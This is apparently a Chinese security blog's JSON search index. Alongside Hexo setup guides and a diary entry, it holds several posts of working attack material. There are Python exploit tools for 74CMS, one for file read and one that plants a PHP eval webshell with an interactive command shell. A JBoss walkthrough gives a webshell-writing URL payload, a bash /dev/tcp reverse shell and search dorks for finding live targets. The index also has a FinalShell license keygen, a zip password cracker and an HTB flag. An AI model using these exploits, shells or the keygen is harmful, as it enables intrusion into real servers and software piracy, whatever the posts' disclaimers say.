[{"title":"2022小雪补记","url":"/article/75df7cb4.html","content":"转瞬间，搭建 GitHub 个人博客已有一年……\n期间生离死别侵扰，思绪纷生……\n人生苦乐多，且行且珍惜……\n须知人生做事……\n“贵在坚持、思考与行动“\n莫待……\n”现在的你不努力，未来的你·该有多狼狈“\n","categories":["随笔"],"tags":["随笔"]},{"title":"74CMS_4.2.3_任意文件读取_CNVD-2017-26183","url":"/article/c48c7d63.html","content":"0x00 前言\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io/article/c48c7d63.html\n\n0x01 源码&quot;&quot;&quot;声明：本文为 漏洞编号CNVD-2017-26183 ，即 74CMS 任意文件读取漏洞利用工具源码内容文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！更多介绍请访问笔者博客：0xtlu.github.io注：1. uid+time() 构成图片名，由于网路问题 time() 会出现一定偏差导致无法的到文件的正确名称2. 因本工具没有设置爆破 time() 功能，故多运行几次本工具大致可以，反之，需要爆破请求的时间戳&quot;&quot;&quot;from requests import Sessionfrom time import time, strftimefrom hashlib import md5# 读取内容写入图片文件def text_read():    print(&#x27;正在写入读取数据……&#x27;)    # 待检测 URL    url = &#x27;http://127.0.0.1/index.php?m=&amp;c=members&amp;a=register&#x27;    # 待读取文件    # 读取数据库配置文件：../../../../Application/Common/Conf/db.php    read_file = &#x27;../../../../../../../../this_is_flag&#x27;    uid = str(int(time()) % 10000000)    username = md5(uid.encode(encoding=&#x27;utf-8&#x27;)).hexdigest()[19:25]    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&#x27;,        &#x27;Cookie&#x27;: &#x27;members_bind_info[temp_avatar]=&#123;read_file&#125;; members_bind_info[type]=qq; members_uc_info[password]=admin123; members_uc_info[uid]=&#123;uid&#125;; members_uc_info[username]=tql&#123;username&#125;&#x27;.format(            read_file=read_file, uid=uid, username=username),        &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;    &#125;    data = &#x27;ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind&#x27;    time_stamp = str(int(time()) + 2)    response = Session().post(url=url, headers=headers, data=data, timeout=5)    # print(time_stamp)    if (response.status_code == 404):        print(&#x27;图片成功写入数据！&#x27;)        return (uid + time_stamp)    else:        print(&#x27;数据写入失败！&#x27;)        return &#x27;666&#x27;# 图片名获取与图片下载def jpg_data(flag):    print(&#x27;开始读取图片数据&#x27;)    headers = &#123;&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&#x27;&#125;    if (flag != &#x27;666&#x27;):        jpgname = md5((flag).encode(encoding=&#x27;utf-8&#x27;)).hexdigest()        jpg_url = &#x27;http://106.15.50.112:8019/data/upload/avatar/&#123;daytime&#125;/&#123;jpgname&#125;.jpg&#x27;.format(            daytime=strftime(&#x27;%y%m/%d&#x27;), jpgname=jpgname)        response = Session().get(url=jpg_url, headers=headers, timeout=5)        print(jpg_url)        if (response.status_code == 200):            jpg_data = response.content            if (jpg_data != None):                print(&#x27;滴！您有一份图片数据已到账：&#x27;)                print(jpg_data)                # 读取的数据保存                with open(&#x27;./jpg_data.txt&#x27;, &#x27;wb&#x27;) as fp:                    fp.write(jpg_data)                    fp.close()        else:            print(&#x27;很遗憾，无法读到图片！\\n这大致跟编者预设的时间戳有些差别所导致！&#x27;)if (__name__ == &#x27;__main__&#x27;):    flag = text_read()    jpg_data(flag)\n后记\n利用文章请访问：https://0xtlu.github.io/article/1e5c0746.html\n\n","categories":["工具集"],"tags":["爬虫","个人工具","CMS"]},{"title":"74CMS_6.0.48_远程命令执行_CNVD-2021-45280","url":"/article/d95419bd.html","content":"0x00 前言\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io/article/d95419bd.html\n\n源码&quot;&quot;&quot;声明：本文为 漏洞编号 CNVD-2021-45280 ，即 74CMS &lt; 6.0.48 远程命令执行漏洞利用工具源码内容文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！更多介绍请访问笔者博客：0xtlu.github.io&quot;&quot;&quot;from requests import Sessionfrom time import strftime, timefrom hashlib import md5# 待检测Hosthost = &#x27;http://127.0.0.1/&#x27;headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&#x27;&#125;# 报错请求def request(tpl):    url = &#x27;&#123;host&#125;index.php?m=home&amp;a=assign_resume_tpl&#x27;.format(host=host)    data = &#123;        &#x27;variable&#x27;: 1,        &#x27;tpl&#x27;: tpl    &#125;    response = Session().post(url=url, headers=headers, data=data, timeout=5)    # 利用状态码判断是否为 phpinfo() 界面    return response.status_code# 连续请求，写入信息def prove(tpl):    # 日志写入报错信息    request(tpl)    effect = &#x27;data/Runtime/Logs/Home/&#123;data&#125;.log&#x27;.format(data=strftime(&quot;%y_%m_%d&quot;))    # 日志 shell 生效    status_code = request(effect)    return status_code# 验证 shell存在def exist(shellname):    shellurl = &#x27;&#123;host&#125;&#x27;.format(host=host) + shellname + &#x27;.php&#x27;    text_data = Session().get(url=shellurl, headers=headers, timeout=5).status_code    if (text_data == 200):        return shellurl# shell 命令模式def command(shellurl):    flag = &#x27;whoami&#x27;    while (flag != &#x27;000&#x27;):        data = &#123;&#x27;x&#x27;: &#x27;echo system(&quot;&#123;flag&#125;&quot;);&#x27;.format(flag=flag)&#125;        try:            response = Session().post(url=shellurl, headers=headers, data=data, timeout=5)            if (response != None):                print(response.text)            else:                print(&#x27;空界面！！！&#x27;)        except:            print(&quot;错误！错误！异常抛出！！！&quot;)        flag = input(&#x27;\\033[5;31m》》》 \\033[0m&#x27;)# 写shelldef shell():    shellname = md5(str(int(time())).encode(encoding=&#x27;utf-8&#x27;)).hexdigest()[3:9]    tpl = f&#x27;&lt;?php fputs(fopen(&quot;&#123;shellname&#125;.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\\$_POST[x]);?&gt;&quot;)?&gt;; ob_flush();?&gt;&#x27;.format(        shellname=shellname)    print(&#x27;开始 getshell……&#x27;)    # 写入shell    prove(tpl)    print(&#x27;正在检测 shell 存在……&#x27;)    # shell 存在验证    shellurl = exist(shellname)    if (shellurl != None):        print(&#x27;这是您的链接和密码：&#x27; + shellurl + &#x27; 》》》 x\\n希望您用餐愉快！\\n是否进入 shell 模式(1/0)&#x27;)        flag = input()        if (flag == &#x27;1&#x27;):            command(shellurl=shellurl)        else:            print(&#x27;谢谢惠顾！&#x27;)    else:        print(&#x27;Oh……非常可惜，getshell 失败了！&#x27;)def window():    print(&#x27;0. phpinfo()\\n1. getshell&#x27;)    inputvalue = input()    if (inputvalue == &#x27;0&#x27;):        print(&#x27;phpinfo() 验证开始！请等待……&#x27;)        tpl = &#x27;&lt;?php phpinfo(); ob_flush();?&gt;&#x27;        if (prove(tpl) == 200):            print(&#x27;漏洞存在!&#x27;)    elif (inputvalue == &#x27;1&#x27;):        shell()    else:        print(&#x27;一面之缘！！！&#x27;)if __name__ == &#x27;__main__&#x27;:    window()\n\n0x02 后记\n利用文章请访问：https://0xtlu.github.io/article/1e5c0746.html\n\n","categories":["工具集"],"tags":["爬虫","个人工具","CMS"]},{"title":"FinalShell高级版离线激活","url":"/article/7b5c4c0f.html","content":"0x00 前言\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！\n\n虚拟机切来切去好麻烦，还是要远程连接一波，祭出之前网上下载的破解高级版 FinalShell远程连接工具。用着还挺顺的，就发现背景图片无法设置，翻了下度娘，又怕怕留有后门，恰逢看到 FinalShell 离线激活方法，来一波呗\n0x01 程序源码不知名大佬（bb：你就是懒得找）写的 FinalShell 远程连接工具激活码生成程序，借用一下哈~\npackage test;import java.io.IOException;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Scanner;public class FinalShell &#123;    public static void main(String[] args) throws NoSuchAlgorithmException, IOException &#123;        System.out.print(&quot;请输入FinalShell的离线机器码：&quot;);        @SuppressWarnings(&quot;resource&quot;)\t\tScanner reader = new Scanner(System.in);        String machineCode = reader.nextLine();        generateKey(machineCode);    &#125;    public static void generateKey(String hardwareId) throws NoSuchAlgorithmException &#123;        String proKey = transform(61305 + hardwareId + 8552);        String pfKey = transform(2356 + hardwareId + 13593);        System.out.println(&quot;请将此行复制到离线激活中：&quot; + proKey);    &#125;    public static String transform(String str) throws NoSuchAlgorithmException &#123;        @SuppressWarnings(&quot;unused&quot;)\t\tString md5 = hashMD5(str);        return hashMD5(str).substring(8, 24);    &#125;    public static String hashMD5(String str) throws NoSuchAlgorithmException &#123;        MessageDigest digest = MessageDigest.getInstance(&quot;MD5&quot;);        byte[] hashed = digest.digest(str.getBytes());        StringBuilder sb = new StringBuilder();        for (byte b : hashed) &#123;            int len = b &amp; 0xFF;            if (len &lt; 16) &#123;                sb.append(&quot;0&quot;);            &#125;            sb.append(Integer.toHexString(len));        &#125;        return sb.toString();    &#125;&#125;\n0x02 程序使用\n任意账密写入，点击离线激活后进入如下界面，复制机器码备用​\n利用编程工具，如 Eclipse 运行 0x01 处程序说下为什么要用编程工具，假设直接新建文本文件改后缀后在终端运行：第一个报错，字符集不对，无法使用中文，第二个，忘了，就这里让我直接拿 Eclipse 运行程序的。\n根据直接 CV 大法写入激活码，又是一个高级会员的诞生。也可以看到，我心心念念的背景已经设置完成。这么设置？右键终端界面，看到设置背景图片不\n\n0x03 后记\n工具嘛，还是需要自己鼓捣出来的比较好；即便是激活，也是自己动手更加放心。\n\n","categories":["工具集"],"tags":["随笔","远程连接"]},{"title":"GitHub_Hexo_搭建个人博客","url":"/article/882cfd3d.html","content":"0x00 前言\n很久之前就知道，可以通过hexo+GitHub搭建免费的个人博客，当时初步尝试了下，最终由于某些原因一直搁置。现在发觉，搭建一个真正属于自己的博客，特别是使用GitHub，不用特别的来维护，因此又找回来。本文章的大体框架很早前就有了，仅是差整理。今天，天气师傅说也想搭建一个，叫我发份文章，就匆忙整理来发布。\n\n0x01 配置Node.js环境https://nodejs.org/zh-cn/\n为保证完整性，以及方便之后的使用，建议勾选。实话说，我有python，还是两个，它想下就下吧之后怎么也npm i hexo-cli -g不成功，修复下nodejs吧，大致是有些组件没下完，半残的样子。\n# 检测安装成功否node -vnpm -v\n\n0x02 配置Git环境# 两个，自己选，Windows系统https://git-scm.com/download/winhttps://github.com/git-for-windows/git/releases/download/v2.34.0.windows.1/Git-2.34.0-64-bit.exe\n\ngit --version\n\n0x03 配置GitHub创建账号懂吧？访问网址：https://github.com/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F&amp;source=header-home基于创建好的账号，创建博客仓库：https://github.com/new该步用户后续域名和初始主题等设置，可不理会，直接访问博客网址（用户名.github.io）就可看到 GitHub 提供的初始界面，此处未贴图\n0x04 新建Hexo项目# Git操作mkdir hexo\t\t\t\t# 找个喜欢的位置，创建存储hexo的文件夹，只用博客文章之类都放着npm install -g hexo\t\t# 使用Git拉取hexohexo -v\t\t\t\t\t# 查看版本，检测成功否hexo init\t\t\t\t# 初始化hexonpm install\t\t\t\t# 安装hexo的扩展模块hexo g\t\t\t\t\t# 生成静态文件hexo s\t\t\t\t\t# 运行本地服务进行预览hexo s -p 5000\t\t\t# 指定端口运行服务# 国内对GitHub不友好，npm下载容易失败，可以换国内源提速npm config set registry https://registry.npm.taobao.org\t\t#换淘宝源npm config get registry\t\t\t\t\t\t\t\t\t\t#验证\nEdge访问：http://localhost:5000/，强制转成https协议再访问，谷歌不会。\n0x05 Hexo联动Github一、配置Git个人信息# 写入Github的user name和emailgit config --global user.name &quot;0xtlu&quot;git config --global user.email &quot;0xtlu@qq.com&quot;# 生成密钥ssh-keygen -t rsa -C &quot;0xtlu@qq.com&quot;# 之后连续按三次回车进行默认确认。\n\ncat ~/.ssh/id_rsa.pub\t\t#查看SSH密钥ssh -T git@github.com\t\t#检测SSH密钥添加成功\nhttps://github.com/settings/keys\n二、配置Deployment修改配置文件hexo&#x2F;_config.yml，添加如下内容\n# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:  type: git  repo: git@github.com:0xtlu/0xtlu.github.io.git\t# 存放博客文件的仓库  branch: master\t\t\t\t\t# 注意GitHub上分支，现在主分支是main\nssh -T git@github.com\t\t\t# 连接一直报重置git config --global --list\t\t# 检查本地配置的用户名和邮箱# 删除.ssh中所有文件# 重新生成密钥（发现是邮箱写错了）ssh-keygen -t ed25519 -C &quot;0xtlu@qq.com&quot;# 重启电脑，ok# hexo可以上传到GitHub，但无法更新博客？？# 答：2020年10月1日，GitHub仓库默认分支由master改为main，而hexo配置文件_config.yml中的Deployment所属branch默认为master，修改为main重新上传即可。\n\n0x06 部署项目hexo new &quot;tumei&quot;\t# 创建一篇博客，名为tumeihexo s\t\t\t# 运行本地服务器hexo g\t\t\t# 生成静态文件hexo d\t\t\t# 部署到远程站点hexo clean\t\t# 清理静态页面# 组合命令hexo clean &amp;&amp; hexo g -s\t\t# 清除、生成、启动hexo clean &amp;&amp; hexo g -d\t\t# 清除、生成、部署# 安装远程部署插件# 保存位置为./Hexo/source/_postsnpm install hexo-deployer-git --save\n\n0x07 修改主题cd  ./Hexo\t# 前面你喜欢的位置git clone https://github.com/XPoet/hexo-theme-keep themes/keep\t# 拉取主题到./themes/keep# 修改_config.yml中的theme: landscape改为theme: kepphexo clean\t\t\t# 清理一下public的内容hexo g\t\t\t\t# 重新生成静态文件hexo d\t\t\t\t# 部署GitHub\n\n0x08 后记欢迎各位师傅访问我的博客！！！求三连https://0xtlu.me/https://blog.csdn.net/weixin_46318141&#x2F;​\n","categories":["Hexo"],"tags":["Hexo","keep"]},{"title":"HTB之Dancing","url":"/article/9eefd971.html","content":"TASK 1\n问：SMB这三个字母的缩写代表什么?\n答：Server Message Block\n\n\nTASK 2\n问：中小企业使用哪个端口运行？\n答：445\n\n\nTASK 3\n问：我们的Nmap扫描中出现的端口445的服务名称是什么？\n答：microsoft-ds\n\n\nTASK 4\n问：我们可以使用SMB工具来“列出”共享内容的“标志”或“开关”是什么?\n答：-L\n\n\nTASK 5\n问：Dancing 有多少共享？\n答：4\n\n\nTASK 6\n问：我们最终可以使用空密码访问的共享的名称是什么?\n答：WorkShares\n\n\nTASK 7\n问：我们可以在SMB shell中使用什么命令来下载我们找到的文件?\n答：get\n\n\nSUBMIT FLAG\n问：Submit root flag\n答：\n\n# P.S.kali@kali:~/Test$ nmap -T4 -sV -sC -Pn 10.129.236.182Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 16:01 CSTNmap scan report for 10.129.236.182Host is up (0.56s latency).Not shown: 997 closed tcp ports (conn-refused)PORT    STATE SERVICE       VERSION135/tcp open  msrpc         Microsoft Windows RPC139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp open  microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   311: |_    Message signing enabled but not required| smb2-time: |   date: 2023-02-24T12:03:22|_  start_date: N/A|_clock-skew: 3h59m59sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 107.21 seconds# P.S.smbclient 类似ftp的客户端，访问服务器上的SMB/CIFS资源kali@kali:~/Test$ whatis smbclient smbclient (1)        - ftp-like client to access SMB/CIFS resources on servers# P.S.smbclient -L 获取指定主机上可用的共享列表kali@kali:~/Test$ smbclient -L10.129.236.182Password for [WORKGROUP\\kali]:\tSharename       Type      Comment\t---------       ----      -------\tADMIN$          Disk      Remote Admin\tC$              Disk      Default share\tIPC$            IPC       Remote IPC\tWorkShares      Disk      Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.129.236.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available# P.S.尝试空密码访问共享目录kali@kali:~/Test$ smbclient //10.129.236.182/ADMIN$Password for [WORKGROUP\\kali]:tree connect failed: NT_STATUS_ACCESS_DENIED# P.S.尝试空密码访问共享目录kali@kali:~/Test$ smbclient //10.129.236.182/C$Password for [WORKGROUP\\kali]:tree connect failed: NT_STATUS_ACCESS_DENIED# P.S.尝试空密码访问共享目录，可以，但内容不符kali@kali:~/Test$ smbclient //10.129.236.182/IPC$Password for [WORKGROUP\\kali]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; help?              allinfo        altname        archive        backup         blocksize      cancel         case_sensitive cd             chmod          chown          close          del            deltree        dir            du             echo           exit           get            getfacl        geteas         hardlink       help           history        iosize         lcd            link           lock           lowercase      ls             l              mask           md             mget           mkdir          more           mput           newer          notify         open           posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    posix_unlink   posix_whoami   print          prompt         put            pwd            q              queue          quit           readlink       rd             recurse        reget          rename         reput          rm             rmdir          showacls       setea          setmode        scopy          stat           symlink        tar            tarmode        timeout        translate      unlock         volume         vuid           wdel           logon          listconnect    showconnect    tcon           tdis           tid            utimes         logoff         ..             !              # P.S.退出当前连接的共享smb: \\&gt; exit# P.S.尝试空密码访问共享目录kali@kali:~/Test$ smbclient //10.129.236.182/WorkSharesPassword for [WORKGROUP\\kali]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; help?              allinfo        altname        archive        backup         blocksize      cancel         case_sensitive cd             chmod          chown          close          del            deltree        dir            du             echo           exit           get            getfacl        geteas         hardlink       help           history        iosize         lcd            link           lock           lowercase      ls             l              mask           md             mget           mkdir          more           mput           newer          notify         open           posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    posix_unlink   posix_whoami   print          prompt         put            pwd            q              queue          quit           readlink       rd             recurse        reget          rename         reput          rm             rmdir          showacls       setea          setmode        scopy          stat           symlink        tar            tarmode        timeout        translate      unlock         volume         vuid           wdel           logon          listconnect    showconnect    tcon           tdis           tid            utimes         logoff         ..             !              # P.S.列文件smb: \\&gt; ls  .                                   D        0  Mon Mar 29 16:22:01 2021  ..                                  D        0  Mon Mar 29 16:22:01 2021  Amy.J                               D        0  Mon Mar 29 17:08:24 2021  James.P                             D        0  Thu Jun  3 16:38:03 2021\t\t5114111 blocks of size 4096. 1751387 blocks available# P.S.切目录smb: \\&gt; cd Amy.J# P.S.列文件smb: \\Amy.J\\&gt; ls  .                                   D        0  Mon Mar 29 17:08:24 2021  ..                                  D        0  Mon Mar 29 17:08:24 2021  worknotes.txt                       A       94  Fri Mar 26 19:00:37 2021\t\t5114111 blocks of size 4096. 1751372 blocks available# P.S.习惯性查看，无效smb: \\Amy.J\\&gt; cat worknotes.txtcat: command not found# P.S.拉取共享目录文件到本地smb: \\Amy.J\\&gt; get worknotes.txtgetting file \\Amy.J\\worknotes.txt of size 94 as worknotes.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)# P.S.切目录smb: \\Amy.J\\&gt; cd ../James.P# P.S.列文件smb: \\James.P\\&gt; ls  .                                   D        0  Thu Jun  3 16:38:03 2021  ..                                  D        0  Thu Jun  3 16:38:03 2021  flag.txt                            A       32  Mon Mar 29 17:26:57 2021\t\t5114111 blocks of size 4096. 1751369 blocks available# P.S.这个看起来比较像，继续拉取smb: \\James.P\\&gt; get flag.txtgetting file \\James.P\\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)# P.S.退出连接mb: \\James.P\\&gt; exit# P.S.列本地目录kali@kali:~/Test$ lsflag.txt  starting_point_iIl1o0O.ovpn  worknotes.txt# P.S.查看拉取到本地的 flag.txtkali@kali:~/Test$ cat flag.txt 5f61c10dffbc77a704d76016a22f1664\n\n\n\nP.S.nmap 扫描，开放 445 端口，SMB 服务，smbclient 工具查看共享目录，尝试空密码连接共享目录，逐一查看共享目录文件。\n\n","categories":["靶场"],"tags":["HTB","通关"]},{"title":"HTB之Fawn","url":"/article/1be3be6a.html","content":"","categories":["靶场"],"tags":["HTB","通关"]},{"title":"JBOSS未授权漏洞详细复现","url":"/article/47bedf0b.html","content":"0x00 前言\n习常规而明其理，探非凡且有所见。 –涂寐声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io\n\n0x01 JBOSS未授权访问简介\nJBOSS是一个基于J2EE的开放源代码应用服务器，也是一个管理EJB的容器和服务器，默认使用8080端口监听。\nJBOSS未授权访问漏洞表现为，在默认情况下无需账密就可以直接访问 http://127.0.0.1:8080/jmx-console 进入管理控制台，进而导致网站信息泄露、服务器被上传shell（如反弹shell，wget写webshell文件），最终网站被攻陷。\n该漏洞影响所有低版本的JBOSS，对其下用户影响深远。\n\n0x02 JBOSS未授权复现一1、Docker容器搭建环境#搜索JBoss环境docker search testjboss#选择需要的环境docker pull testjboss/jboss#实例化testjboss/jboss镜像docker run -d-p 80:8080 testjboss/jboss\n\n\n\n2、访问127.0.0.1，找到漏洞点\n\n\n3、生成warSehll#自备脚本tumei.jsp#生成war命令jar cvf admin.war tumei.jsp\n\n4、apache2部署远程服务器#安装apache2apt-get install apache2#apache2所有文件所在位置/etc/apache2#apache2运行文件/etc/init.d/apache2#查看kali默认web站点位置是否含有/var/www/htmlcd /var/www/html#不存在，创建/var/www/html目录mkdir -p /var/www/html#将admin.war移入/var/www/htmlcp admin.war /var/www/html#开启apache2服务service apache2 start#确认已开启service apache2 status#访问web站点http://127.0.0.1/http://192.168.31.133/\n\n\n4、通过addurl参数远程部署Shell#远程服务器中war包的位置http://192.168.31.133/admin.war#war上传成功，会显示成功界面。#也可以直接访问http://127.0.0.1/jmx-console/，查看http://127.0.0.1/jmx-console/，是否含有对应的war包#抑或，访问http://127.0.0.1/admin/，显示war包中文件tumei.jsp\n\n\n\n\n5、成功getshell，上传永久shell#由于当前目录的shell仅能临时获取权限,因此把shell传到jmx-console的默认目录来巩固权限#jmx-console的默认目录路径/opt/jboss/jboss4/server/default/deploy/jmx-console.war/#直接利用文件管理传shell，避免临时目录下的shell被删无法连接\n\n\n0x03 JBOSS未授权复现二1、查找JBOSS站点①Google语法产找相关站点（有丢丢少，大概是浏览器的问题吧）：inurl:”8080&#x2F;jmx-console&#x2F;“②FOFA空间搜索引擎语句：**”jboss” &amp;&amp; port&#x3D;”8080” &amp;&amp; country&#x3D;”CN”**\n2、JBOSS漏洞检测①各位师傅若有闲情，可以先使用nmap工具扫描8080端口是否开放（nmap -PN ip），但笔者使用fofa搜索时限定扫描了8080端口，直接访问http://ip:8080/jmx-console和http://ip:8080/web-console就好了，成功，确认未授权的存在。\n\n②手工传马，直接URL中写入大佬的一句话shell（写入文件功能），并可以通过脚本（shell.jsp）在其同级目录下新建其他文件（注意进行编码绕过）。\n#写文件功能http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&amp;argType=boolean&amp;arg4=True\n\n#arg0：war包的名称，arg1：文件名称，arg2：文件后缀名，arg3：文件内容#f=文件名，t=脚本文件内容（注意进行编码绕过）#文件写入举例http://127.0.0.1:8080/August/shell.jsp?f=admin.txt&amp;t=hhhhhhhhhhhhhhhhh#文件访问举例http://127.0.0.1:8080/August/admin.txt#对应URL解码http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin:service=DeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt;&amp;argType=boolean&amp;arg4=True\n\n\n\n0x04 JBOSS未授权复现三#尝试下大佬写的检测工具：https://github.com/joaomatosf/jexboss#jexboss是一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。#git下载jexbossgit clone https://github.com/joaomatosf/jexboss#切换jexboss所在目录cd jexboss-master/#执行检测192.168.31.131，此处端口为80python3 jexboss.py -u 192.168.31.131:80#机器A反弹shell到其他机器（B）#B机器（192.168.31.131）开启监听nc -l -p 666#A利用jexboss连接jboss后，反弹shell到机器B的666端口bash -i &gt;&amp; /dev/tcp/192.168.31.131/666 0&gt;&amp;1\n\n\n\n\n0x05 JBOSS未授权防护1、对jmx-console和web-console界面访问增加强认证。2、关闭jmx-console和web-console，提高安全性。\n0x06 后记\n漏洞复现很简单，尝试了多种方式，非常不错，学到挺多的。原本想着尝试学大佬做防护，但重启容器后看不出有什么改变，还是继续努力吧。 –涂寐\n\n0x07 知识链接\nhttp://t.zoukankan.com/-an--p-13566483.html\nhttps://www.bbsmax.com/A/8Bz8qG2NJx/\nhttps://www.cnblogs.com/hackxf/p/8951699.html#autoid-1-1-0\n\n","categories":["复现"],"tags":["CMS","未授权"]},{"title":"Keep主题之51la网站统计","url":"/article/402ba0c4.html","content":"0x00 声明\n文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io ，转载请注明出处！！！\n\n0x01 51la网站统计51.LA网站统计V6重要的是免费，网站统计功能还很棒，需要详细了解的可以访问查看官方介绍：https://invite.51.la/1NZWTZ136?target=V6\n0o00 配置51la邀请注册：https://invite.51.la/1NZWTZ136?target=V6用户中心：https://user.51.la/i/product这里使用的的网站统计V6，进去后点击添加应用，基本信息那写好自己的域名等信息。\n0o01 配置Hexo统计代码 –&gt; 普通安装 –&gt; 复制统计代码并粘贴到Hexo主题下的 footer.ejs 或者 header.ejs 里保存，重新打包生成 html 文件（建站程序插件安装及教程这有介绍）。我这是Keep主题，路径是这样的..\\Blogs\\myHexo2\\themes\\keep\\layout\\_partial\\header.ejs，在最后一个&lt;/div&gt;和&lt;/header&gt;标签间插入。重新部署到 GitHub 上，等待几分钟，就可以去点击代码安装检测看安装成功没有了（可能有点久）。\n0o02 配置数据挂件上面只是在51la的后台可以看到，我需要的可还有在博客上可以看到：开启数据挂件功能 –&gt; 选择需要的样式。\n数据挂件添加的路径：..\\Blogs\\myHexo2\\themes\\keep\\layout\\_partial\\footer.ejs。\n一样，重新部署后等待，看下我的效果，字体大小可能需要细调。\n","categories":["Hexo"],"tags":["Hexo","keep"]},{"title":"Python爆破Zip密码","url":"/article/49fe31ad.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：http://localhost:4000/article/49fe31ad.html\n\n#!/usr/bin/env python# -*- coding: UTF-8 -*-&quot;&quot;&quot;@Project ：python黑客 @File ：Zip压缩包爆破.py@IDE  ：PyCharm @Author ：涂寐@Date ：2022/2/24 0:01 &quot;&quot;&quot;from pyzipper import ZipFile, AESZipFile# 文件存在性检测def exist(filename):    try:        with open(filename, &#x27;r&#x27;) as fp:            fp.close()    except:        print(filename + &#x27; 文件不存在！！！&#x27;)        exit(0)# 读取字典def read_dicts(filename):    # 打开压缩包，存入字典    with open(filename, &#x27;r&#x27;) as fp:        # strip() ：默认删除开头或末位的空格|换行符        # readlines() ：读取所有行(直到结束符 EOF)并返回列表        # 使用列表解析，对列表中读取到的每一行首尾去换行，更快捷的生成新的列表        dicts = [pwd.strip(&#x27;\\n&#x27;) for pwd in fp.readlines()]        fp.close()        return dicts    return Falsh# 单例解密def case(zip_file, pwd):    try:        zip_file.extractall(pwd=str.encode(pwd))        print(&#x27;滴！您得到一枚密码：&#x27; + pwd)        return 1    except Exception as e:        pass# 爆破def blast(zip_file, dicts):    for pwd in read_dicts(dicts):        if case(zip_file, pwd) == 1:            exit(0)def main(dict_file, zip_file):    # 存在性检测    exist(dict_file)    exist(zip_file)    # Zip Crypto 算法加密的 zip 压缩包    open_zip = ZipFile(zip_file)    # 调用爆破方法    blast(open_zip, dict_file)    # 关闭压缩包    open_zip.close()    # AES-256 算法加密的 zip 压缩包    # 安装 pip install pyzipper    open_zip = AESZipFile(zip_file)    blast(open_zip, dict_file)    open_zip.close()if __name__ == &#x27;__main__&#x27;:    # 字典    dict_file = &#x27;./makings/1dicts.txt&#x27;    # zip 压缩包    zip_file = &#x27;./test_8606.zip&#x27;    main(dict_file, zip_file)","categories":["Python"],"tags":["个人工具","困"]},{"title":"Ubuntu安装宝塔","url":"/article/880e0d76.html","content":"0x00 